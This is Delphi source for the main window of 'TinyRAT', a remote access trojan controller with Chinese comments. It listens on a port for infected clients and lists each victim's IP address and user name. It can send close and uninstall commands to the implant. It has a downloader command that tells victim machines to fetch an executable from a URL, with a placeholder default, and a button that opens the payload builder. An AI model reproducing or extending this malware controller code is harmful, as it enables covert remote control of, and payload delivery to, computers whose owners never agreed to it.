unit UnitMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, StdCtrls, Sockets, VarUnit, UnitManager,
  Menus;

type
  TFormMain = class(TForm)
    SBarEx: TStatusBar;
    PanelEx: TPanel;
    DNSListView: TListView;
    Label_Port: TLabel;
    Edit_Port: TEdit;
    Button_Start: TButton;
    Button_Stop: TButton;
    Button_Builder: TButton;
    PopupMenu1: TPopupMenu;
    OpenClient1: TMenuItem;
    CloseClient1: TMenuItem;
    N1: TMenuItem;
    Downloader1: TMenuItem;
    N2: TMenuItem;
    RemoveClient1: TMenuItem;
    procedure Button_StartClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button_StopClick(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure DNSListViewDblClick(Sender: TObject);
    procedure OpenClient1Click(Sender: TObject);
    procedure CloseClient1Click(Sender: TObject);
    procedure Downloader1Click(Sender: TObject);
    procedure RemoveClient1Click(Sender: TObject);
    procedure Button_BuilderClick(Sender: TObject);
  private
    { Private declarations }
  public
    procedure ClientConnect(Sender: TObject; ClientSocket: TCustomWinSocket);
    procedure ClientRead(Sender: TObject; ClientSocket: TCustomWinSocket);
    procedure ClientDisconnect(Sender: TObject; ClientSocket: TCustomWinSocket);
    procedure ClientError(Sender: TObject; Socket: TCustomWinSocket;ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    { Public declarations }
  end;

  TClientSession = Class
    bIsLogin: Boolean;
    ClientSocket: TCustomWinSocket;
    CListItem: TListItem;
    CFormManager: TFormManager;
  end;

var
  FormMain: TFormMain;

implementation

{$R *.dfm}

uses
  UnitBuilder;

var
  MasterSocket: TServerSocket;
  ClientLists: TList;

////////////////////////////////////////////////////////////////////////////////

//  Client连接Server
procedure TFormMain.ClientConnect(Sender: TObject; ClientSocket: TCustomWinSocket);
var
  ClientSession: TClientSession;
begin
  ClientSession := TClientSession.Create;
  ClientSession.bIsLogin := False;
  ClientLists.Add(ClientSession);
  ClientSocket.Data := ClientSession;
  ClientSession.ClientSocket := ClientSocket;
end;

//  Client连接链接
procedure TFormMain.ClientDisconnect(Sender: TObject; ClientSocket: TCustomWinSocket);
var
  ClientSession: TClientSession;
begin
  ClientSession := TClientSession(ClientSocket.Data);
  if ClientSession.bIsLogin then
  begin
    ClientSession.CListItem.Delete;
    //ClientSession.CFormManager.Close;
    ClientSession.CFormManager.Free;
    SBarEx.Panels.Items[0].Text := 'Online Client: ' + IntToStr(DNSListView.Items.Count);
  end;
  ClientSession.Free;
  ClientLists.Remove(ClientSession);
end;

//  Client连接出错
procedure TFormMain.ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  Socket.Close;
  ErrorCode := 0;
end;

//  Server读取Client发送信息
procedure TFormMain.ClientRead(Sender: TObject; ClientSocket: TCustomWinSocket);
var
  MiniBuffer: TMinBufferHeader;
  ClientSession: TClientSession;
  StrBuffer, StrUser, StrName: String;
  lpBuffer: Pointer;
  dwLen, dwResult: DWORD;
begin
  dwResult := ClientSocket.ReceiveLength;
  if dwResult = 0 then Exit;
  GetMem(lpBuffer, dwResult + 1);
  ZeroMemory(lpBuffer, dwResult + 1);
  ClientSession := TClientSession(ClientSocket.Data);
  dwLen := ClientSocket.ReceiveBuf(lpBuffer^, dwResult + 1);
  if dwLen = 0 then Exit;

  if Not (ClientSession.bIsLogin) then
  begin
    StrBuffer := Pchar(lpBuffer);
    MiniBuffer := PMinBufferHeader(lpBuffer)^;

    if MiniBuffer.dwSocketCmd = Client_Online then
    begin
      Delete(StrBuffer, 1, 4);
      StrUser := Trim(Split(StrBuffer, '|', 1));
      StrName := Trim(Split(StrBuffer, '|', 2));
      DNSListView.Items.BeginUpdate;
      ClientSession.CListItem := DNSListView.Items.Add;
      ClientSession.CListItem.Caption := IntToStr(ClientSession.ClientSocket.SocketHandle);
      ClientSession.CListItem.SubItems.Add(ClientSession.ClientSocket.RemoteAddress);
      ClientSession.CListItem.SubItems.Add(StrUser + '\' + StrName);
      ClientSession.CListItem.SubItems.Add('0');
      ClientSession.CListItem.Data := ClientSession;
      DNSListView.Items.EndUpdate;
      ClientSession.bIsLogin := True;
      MiniBuffer.dwSocketCmd := Client_Online;
      ClientSession.CFormManager := TFormManager.Create(Application);
      ClientSession.CFormManager.ClientSocket := ClientSocket;
      ClientSession.CFormManager.IconList := TStringList.Create;
      ClientSession.CFormManager.IconList.Add('|');
      ClientSession.CFormManager.IconList.Add('|');

      ClientSession.ClientSocket.SendBuf(MiniBuffer, Sizeof(MiniBuffer));
      SBarEx.Panels.Items[0].Text := 'Online Client: ' + IntToStr(DNSListView.Items.Count);
    end;
  end else
  begin
    ClientSession.CFormManager.ClientWork(ClientSocket, lpBuffer);
  end;
  FreeMem(lpBuffer);
end;

////////////////////////////////////////////////////////////////////////////////

//  开始监听
procedure TFormMain.Button_StartClick(Sender: TObject);
var
  iPort: Integer;
begin
  if MasterSocket.Active then Exit;
  
  try
    iPort := StrToInt(Edit_Port.Text);
    if (iPort > 65535) or (iPort < 1) then
    begin
      MessageBox(Application.Handle, '请选择正确的监听端口!', nil, MB_ICONERROR);
      Exit;
    end;

    try
      MasterSocket.Port := iPort;
      MasterSocket.Open;
      //  判断端口是否监听成功
      if MasterSocket.Active then
      begin
        Edit_Port.Enabled := False;
        Button_Start.Enabled := False;
        Button_Stop.Enabled := True;
        SBarEx.Panels.Items[1].Text := 'Listen On Port: ' + IntToStr(iPort);
      end;
    except
      MessageBox(Application.Handle, '端口监听失败!请检查端口是否被占用!', nil, MB_ICONERROR);
      Exit;
    end;
  except
    MessageBox(Application.Handle, '请选择正确的监听端口!', nil, MB_ICONERROR);
    Exit;
  end;
end;

//  停止监听
procedure TFormMain.Button_StopClick(Sender: TObject);
var
  iCout: Integer;
  ClientSession: TClientSession;
begin
  if Not (MasterSocket.Active) then Exit;

  for iCout := 0 to ClientLists.Count - 1 do
  begin
    ClientSession := TClientSession(ClientLists.Items[0]);
    ClientSession.ClientSocket.Close;
  end;

  Edit_Port.Enabled := True;
  Button_Start.Enabled := True;
  Button_Stop.Enabled := False;
  MasterSocket.Close;
  SBarEx.Panels.Items[1].Text := 'Listen On Port: Close';
end;

//  窗口加载时
procedure TFormMain.FormCreate(Sender: TObject);
begin
  FormMain.Caption := 'TinyRAT V 1.0.0.0';
  ClientLists := TList.Create;
  MasterSocket := TServerSocket.Create;
  MasterSocket.OnClientConnect := ClientConnect;
  MasterSocket.OnClientDisconnect := ClientDisconnect;
  MasterSocket.OnClientError := ClientError;
  MasterSocket.OnClientRead := ClientRead;
end;

//  窗口关闭
procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Button_StopClick(Self);
  ClientLists.Free;
  MasterSocket.Free;
end;

//  右键激活
procedure TFormMain.PopupMenu1Popup(Sender: TObject);
var
  CListItem: TListItem;
begin
  CListItem := DNSListView.Selected;
  if Assigned(CListItem) then
  begin
    OpenClient1.Enabled := True;
    CloseClient1.Enabled := True;
    Downloader1.Enabled := True;
    RemoveClient1.Enabled := True;
  end else
  begin
    OpenClient1.Enabled := False;
    CloseClient1.Enabled := False;
    Downloader1.Enabled := False;
    RemoveClient1.Enabled := False;
  end;
end;

//  双击
procedure TFormMain.DNSListViewDblClick(Sender: TObject);
var
  CListItem: TListItem;
  ClientSession: TClientSession;
begin
  CListItem := DNSListView.Selected;
  if Assigned(CListItem) then
  begin
    ClientSession := TClientSession(CListItem.Data);
    ClientSession.CFormManager.Show;
  end;
end;

//  鼠标右键点击
procedure TFormMain.OpenClient1Click(Sender: TObject);
begin
  DNSListViewDblClick(Self);
end;

//  发送关闭服务端指令
procedure TFormMain.CloseClient1Click(Sender: TObject);
var
  CListItem: TListItem;
  ClientSession: TClientSession;
  MinBuffer: TMinBufferHeader;
begin
  CListItem := DNSListView.Selected;
  if Assigned(CListItem) then
  begin
    ClientSession := TClientSession(CListItem.Data);
    MinBuffer.dwSocketCmd := Client_Close;
    ClientSession.ClientSocket.SendBuf(MinBuffer, MIN_BUFFER_SIZE);
    ClientSession.CFormManager.Show;
  end;
end;

//  卸载远程Client
procedure TFormMain.RemoveClient1Click(Sender: TObject);
var
  CListItem: TListItem;
  ClientSession: TClientSession;
  MinBuffer: TMinBufferHeader;
begin
  CListItem := DNSListView.Selected;
  if Assigned(CListItem) then
  begin
    ClientSession := TClientSession(CListItem.Data);
    MinBuffer.dwSocketCmd := Client_Remove;
    ClientSession.ClientSocket.SendBuf(MinBuffer, MIN_BUFFER_SIZE);
    ClientSession.CFormManager.Show;
  end;
end;

//  下载远程链接
procedure TFormMain.Downloader1Click(Sender: TObject);
const
  StrURL = 'http://www.xxx.com/test.exe';
var
  CListItem: TListItem;
  ClientSession: TClientSession;
  StrDownUrls: String;
begin
  CListItem := DNSListView.Selected;
  if Assigned(CListItem) then
  begin
    StrDownUrls := InputBox('Downloader', 'Input Download Url:', StrURL);
    if Length(StrDownUrls) = 0 then Exit;
    if StrDownUrls = StrURL then Exit;

    ClientSession := TClientSession(CListItem.Data);
    StrDownUrls := MakeSocketCmd(Client_Download) + StrDownUrls;
    ClientSession.ClientSocket.SendText(StrDownUrls);
  end;
end;

////////////////////////////////////////////////////////////////////////////////
//  生成器创建窗口
procedure TFormMain.Button_BuilderClick(Sender: TObject);
begin
  UnitBuilder.FormBuilder.ShowModal;
end;

end.
